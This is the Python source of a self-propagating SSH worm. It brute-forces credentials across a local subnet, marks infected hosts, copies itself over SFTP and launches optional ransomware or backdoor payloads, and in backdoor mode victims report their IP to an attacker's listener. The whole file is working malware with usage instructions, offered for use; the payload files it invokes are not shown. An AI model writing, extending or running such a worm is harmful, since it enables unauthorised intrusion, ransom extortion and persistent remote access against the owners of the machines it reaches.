""" Standard replicator worm, take optional arguments for a ransomware worm or a backdoor worm.
    
    USAGE:
        Replicator Worm:
            1. $ python replicator.py usernames.txt passwords.txt
            2. Wait 
        Ransom Worm: 
            1. $ python replicator.py local_ransom.py usernames.txt passwords.txt
            2. Wait

        Backdoor Worm:   
            1. $ python recv.py
            2. Open a new terminal tab for the next command 
            3. $ python replicator.py local_backdoor.py usernames.txt passwords.txt
            4. Wait (can be a while before victims send their IP back)

    """
import sys
from SSHConnection import SSHConnection
from SSHConnection import get_local_ip

def transfer_file(worm, filename):
    """ Transfers a file, must be in same directory as ransom.py """
    sftp_client = worm.ssh_connection.open_sftp()
    sftp_client.chdir(worm.target_dir)
    sftp_client.put(filename, filename)

def launch_attack(worm, malicious_file):
    """ Sends signal to program to call another python file that will do all the bad stuff locally
        so that the worm isn't stuck doing it all through ssh commands. """
    worm.ssh_connection.exec_command("python " + malicious_file)

def main():
    """ Main function that does all the heavy lifting. See usage details above """
    worm = SSHConnection()
    message = "Your security is bad and you should feel bad"

    # # # Arguments Reference # # # # # # # # # # # # # # # # # # # # #
    # current_script = sys.argv[0]
    # local_attacker = sys.argv[1] or empty for standard replication
    # marker_file = sys.argv[2]
    # username_file = sys.argv[3]
    # password_file = sys.argv[4]
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

    files = []
    for filename in sys.argv:
        files.append(filename)
    files.append("SSHConnection.py")
    # Runnning ansomware worm
    if files[1] == "local_ransom.py":
        worm.marker_file = "ransom_marker.txt"
        malicious_file = files[1]
        worm.set_username_file(files[2])
        worm.set_password_file(files[3])
        worm.set_worm_file("local_ransom.py")
    # Running backdoo worm
    elif files[1] == "local_backdoor.py":
        worm.marker_file = "backdoor_marker.txt"
        malicious_file = files[1]
        worm.set_username_file(files[2])
        worm.set_password_file(files[3])
        worm.set_worm_file("local_backdoor.py")
    # Running standad replicator worm
    elif files[1] == "usernames.txt":
        worm.worm_file = "replicator.py"
        worm.marker_file = "replicator_marker.txt"
        worm.set_username_file(files[1])
        worm.set_password_file(files[2])
        worm.set_worm_file("replicator.py")
        malicious_file = "replicator.py " + worm.username_file + " " + worm.password_file
    else:
        print "Bad input file"
        return

    files.append(worm.marker_file)

    # Create worm instance and search first 10 ips on the network
    worm.retrieve_vulnerable_hosts("192.168.1.", 10)
    # Set the file the worm will look for on the target system
    if worm.find_target_host():
        # Found an unmarked host, copy the files over to it.
        worm.set_target_dir("/home/" + worm.username + "/")
        #with open(worm.marker_file, "w") as marker:
        #    marker.write(worm.password + "\n" + get_local_ip())
        for filename in files:
            transfer_file(worm, filename)
        print "[+] Completed! Launching local attack now..."
        # Optinal command to add infector's ip to the marker file
        #worm.ssh_connection.exec_command("echo " + get_local_ip() + " >> " + worm.marker_file)
        worm.ssh_connection.exec_command("echo " + message + " >> " + worm.marker_file)
        launch_attack(worm, malicious_file)
    else:
        # Either no hosts found, or they all had the marker file on their system
        print " :( No target found, better get a job!"

if __name__ == "__main__":
    main()
